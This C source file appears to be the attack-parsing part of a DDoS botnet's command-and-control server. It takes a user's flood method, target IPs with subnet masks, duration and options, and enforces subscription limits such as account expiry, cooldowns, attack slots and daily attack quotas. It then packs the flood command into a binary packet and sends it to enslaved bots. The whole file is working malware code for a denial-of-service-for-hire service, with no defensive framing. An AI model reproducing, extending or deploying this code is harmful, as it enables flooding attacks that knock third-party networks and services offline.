#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <ctype.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#include "util.h"
#include "client.h"
#include "slots.h"
#include "bool.h"
#include "main.h"

#include "debug.h"
#include "db.h"
#include "bot.h"
#include "attack.h"

method_t *attack_get_method(char *method_str) {
	for (int i = 0; i < LEN(methods); i++) {
		method_t *method = &methods[i];

		if (!strcmp(method->flood, method_str))
			return method;
	}

	return NULL;
}

BOOL parse_check_ipv4(char *addr) {
    struct sockaddr_in sa = {0};
    int result = inet_pton(AF_INET, addr, &(sa.sin_addr));
    return result != 0;
}

BOOL attack_is_valid_opt(method_t *method, uint8_t opt) {
	for (int i = 0; i < method->opt_len; i++) {
		if (method->opts[i] == opt)
			return TRUE;
	}

	return FALSE;
}

void attack_free(attack_t *attack) {
	if (attack->targs)
		free(attack->targs);
	if (attack->opts)
		free(attack->opts);
}

option_t *parse_get_option_from_id(uint8_t id) {
	for (int i = 0; i < ATTACK_OPT_LEN; i++) {
		option_t *opt = &opts[i];
		if (opt->id == id)
			return opt;
	}

	return NULL;
}

option_t *parse_get_option(char *opt_str) {
	for (int i = 0; i < ATTACK_OPT_LEN; i++) {
		option_t *opt = &opts[i];
		if (!strcmp(opt_str, opt->opt_str))
			return opt;
	}

	return NULL;
}

void parse_parse_option(option_t *opt, char *val) {
	switch (opt->type) {
		case UINT8:
			opt->data = calloc(1, sizeof(uint8_t));
			opt->len = sizeof(uint8_t);

			*(uint8_t *)opt->data = atoi(val);
			break;

		case UINT16:
			opt->data = calloc(1, sizeof(uint16_t));
			opt->len = sizeof(uint16_t);

			*(uint16_t *)opt->data = htons(atoi(val));
			break;

		case UINT32:
			opt->data = calloc(1, sizeof(uint32_t));
			opt->len = sizeof(uint32_t);

			*(uint32_t *)opt->data = htonl(atoi(val));
			break;

		case STRING:
			opt->len = strlen(val);
			opt->data = calloc(opt->len, sizeof(char));
			strncpy(opt->data, val, opt->len);
			break;
	}
}

BOOL parse_targets(attack_t *attack, client_t *client, char *targs) {
	char *ptr;

	if (!targs) {
		util_sockprintf(client->fd, "Please specify targets\r\n");
		return FALSE;
	}

	attack->targ_len = util_count(targs, ',', 1);
	attack->targs = calloc(attack->targ_len, sizeof(target_t));

	for (int i = 0; i < attack->targ_len; i++) {
		target_t *targ = &attack->targs[i];

		char *targ_data = strtok_r(targs, ",", &targs);
		char *targ_str = strtok_r(targ_data, "/", &ptr);

		if (!targ_str) {
			util_sockprintf(client->fd, "Please specify a target\r\n");
			return FALSE;			
		}

		if (!parse_check_ipv4(targ_str)) {
			util_sockprintf(client->fd, "Please specify a correct ipv4\r\n");
			return FALSE;
		}

		char *mask = strtok_r(NULL, "/", &ptr);

		targ->addr = inet_addr(targ_str);

		if (!mask)
			targ->mask = 32;
		else
			targ->mask = atoi(mask);
	}

	return TRUE;
}

void display_method_options(client_t *client, method_t *method) {
	for (int i = 0; i < LEN(method->opts); i++) {

		if (method->opts[i] == OPT_BOTS || method->opts[i] == OPT_GROUP)
			continue;

		option_t *opt = parse_get_option_from_id(method->opts[i]);

		util_sockprintf(client->fd, "\x1b[91m%s\x1b[0m: %s\r\n", opt->opt_str, opt->description);
	}
}

BOOL parse_options(attack_t *attack, client_t *client) {
	char *ptr;

	attack->opt_len = util_count(client->save_ptr, '=', 0);
	attack->opts = calloc(attack->opt_len, sizeof(option_t));


	/* do we just want to display a help menu? */
	if (!strcmp(client->save_ptr, "?")) {
		display_method_options(client, attack->method);
		return FALSE;
	}

	for (int i = 0; i < attack->opt_len; i++) {
		option_t *opt = &attack->opts[i];

		char *opt_data = strtok_r(NULL, " ", &client->save_ptr);
		char *opt_str = strtok_r(opt_data, "=", &ptr);

		if (!opt_str) {
			util_sockprintf(client->fd, "Please specify an option if you meant to\r\n");
			return FALSE;
		}

		option_t *def_opt = parse_get_option(opt_str);

		if (!def_opt) {
			util_sockprintf(client->fd, "Invalid option '%s' is parsed.\r\n", opt_str);
			return FALSE;
		}

		PRINTF("Parsing option: '%s' id: %d\n", opt_str, def_opt->id);

		if (!attack_is_valid_opt(attack->method, def_opt->id)) {
			util_sockprintf(client->fd, "'%s' is an invalid option for flood '%s'\r\n", opt_str, attack->method->flood);
			return FALSE;
		}

		opt->id = def_opt->id;
		opt->type = def_opt->type;

		char *opt_val = strtok_r(NULL, "=", &ptr);

		if (!opt_val) {
			util_sockprintf(client->fd, "Missing value for option '%s'.\r\n", opt_str);
			return FALSE;
		}

		parse_parse_option(opt, opt_val);
	}

	return TRUE;
}

void parse_calculate_pkt_len(attack_t *attack, uint32_t *pkt_len) {
	*pkt_len += sizeof(uint8_t); // method id

	*pkt_len += sizeof(uint8_t); // target length
	*pkt_len += sizeof(uint8_t); // option length

	/* targets */
	for (int i = 0; i < attack->targ_len; i++) {
		*pkt_len += sizeof(uint32_t); // target
		*pkt_len += sizeof(uint8_t); // mask
	}

	*pkt_len += sizeof(uint32_t); // duration

	/* options */
	for (int i = 0; i < attack->opt_len; i++) {
		*pkt_len += sizeof(uint8_t); // option id
		*pkt_len += sizeof(uint16_t); // option len
		*pkt_len += attack->opts[i].len; // data length
	}
}

void parse_build_flood(attack_t *attack, client_t *client) {
	char *group = NULL;
	uint32_t bots = client->bots;

	uint32_t pkt_len = 0;
	parse_calculate_pkt_len(attack, &pkt_len);

	printf("pkt_len: %d, Attack: %d, duration: %d\n", pkt_len, attack->method_id, attack->duration);

	uint8_t *pkt = calloc(pkt_len, sizeof(uint8_t)), *pkt_base = pkt;

	attack->duration = htonl(attack->duration);
	memcpy(pkt, &attack->duration, sizeof(uint32_t));
	pkt += sizeof(uint32_t);

	*(uint8_t *)pkt++ = attack->method_id;
	*(uint8_t *)pkt++ = attack->targ_len;

	for (int i = 0; i < attack->targ_len; i++) {
		target_t *targ = &attack->targs[i];

		memcpy(pkt, &targ->addr, sizeof(uint32_t));
		pkt += sizeof(uint32_t);

		*(uint8_t *)pkt++ = targ->mask;
	}

	*(uint8_t *)pkt++ = attack->opt_len;

	for (int i = 0; i < attack->opt_len; i++) {
		option_t *opt = &attack->opts[i];

		if (opt->id == OPT_GROUP) {
			group = opt->data;
		}
		else if (opt->id == OPT_BOTS) {
			bots = ntohl(*(uint32_t *)opt->data);
		}
		else {
			*(uint8_t *)pkt++ = opt->id;

			memcpy(pkt, &(int){htons(opt->len)}, sizeof(uint16_t));
			pkt += sizeof(uint16_t);

			memcpy(pkt, opt->data, opt->len);
			pkt += opt->len;
		}
	}

	uint32_t count = bot_send_command(FLOOD, pkt_base, pkt_len, group, bots);

	util_sockprintf(client->fd, "Sent command to %d clients.\r\n", count);
	attack_free(attack);
}

BOOL parse_check_duration(char *duration) {
	while (*duration) {
		if (!isdigit(*duration++))
			return FALSE;
	}

	return TRUE;
}

BOOL has_method_access(client_t *client, char *method) {

	/* we have access to all methods */
	if (!strcmp(client->floods[0], "all"))
		return TRUE;

	for (int i = 0; i < client->flood_count; i++) {

		if (!strcmp(client->floods[i], method)) {
			return TRUE;
		}
	}

	return FALSE;
}

void parse_attack(client_t *client) {
	attack_t attack = {0};

	char *full_attack = strdup(client->buff);

	char *method_str = (strtok_r(client->buff, " ", &client->save_ptr)) + 1; // get rid of prefix with + 1
	attack.method = attack_get_method(method_str);

	if (!attack.method) {
		util_sockprintf(client->fd, "Please specify a correct method.\r\n");
		return attack_free(&attack);
	}

	if (client_is_expired(client)) {
		util_sockprintf(client->fd, "Your account has expired. contact staff.\r\n");
		return attack_free(&attack);
	}

	if (!client_update_fields(client)) {
		util_sockprintf(client->fd, "Your access has been revoked, contact staff.\r\n");
		return attack_free(&attack);
	}

	if (!has_method_access(client, method_str)) {
		util_sockprintf(client->fd, "You dont have access to this method.\r\n");
		return attack_free(&attack);
	}

	attack.method_id = attack.method->id;

	char *targs = (strtok_r(NULL, " ", &client->save_ptr));

	if (!parse_targets(&attack, client, targs))
		return attack_free(&attack);

	char *duration = (strtok_r(NULL, " ", &client->save_ptr));

	if (!duration) {
		util_sockprintf(client->fd, "Please specify a duration.\r\n");
		return attack_free(&attack);
	}

	if (!parse_check_duration(duration)) {
		util_sockprintf(client->fd, "Please specify a valid duration.\r\n");
		return attack_free(&attack);
	}

	attack.duration = atoi(duration);

	if (attack.duration > client->attacktime) {
		util_sockprintf(client->fd, "%ds is your max attack time\r\n", client->attacktime);
		return attack_free(&attack);
	}

	if (!parse_options(&attack, client)) {
		return attack_free(&attack);
	}

	uint32_t global_cooldown = attack_slot_get_cooldown();

	if (!client->admin && global_cooldown > 0) {
		util_sockprintf(client->fd, "Global cooldown is active, please wait %u seconds.\r\n", global_cooldown);
		return attack_free(&attack);
	}

	if (!(client->admin || attack_slot_is_open())) {
		util_sockprintf(client->fd, "All attack slots are in use, please wait.\r\n");
		return attack_free(&attack);
	}

	if (client_on_cooldown(client)) {
		util_sockprintf(client->fd, "You are on cooldown for %d seconds.\r\n",
			(client->cooldown + sql_get_int_val(client->username, "cooldown_timer")) - time(0));
		return attack_free(&attack);;
	}

	if (!client_check_daily_attacks(client)) {
		util_sockprintf(client->fd, "You have no daily attacks left.\r\n");
		return attack_free(&attack);
	}

	/* log the attack */
	client_log_attack(client, full_attack);
	free(full_attack);

	/* add the attack to global attack slots */
	attack_slot_add(client, attack.duration, GLOBAL_COOLDOWN_DURATION);

	/* set cooldown timer */
	client_set_cooldown_timer(client, attack.duration);

	/* parse the flood */
	parse_build_flood(&attack, client);
}
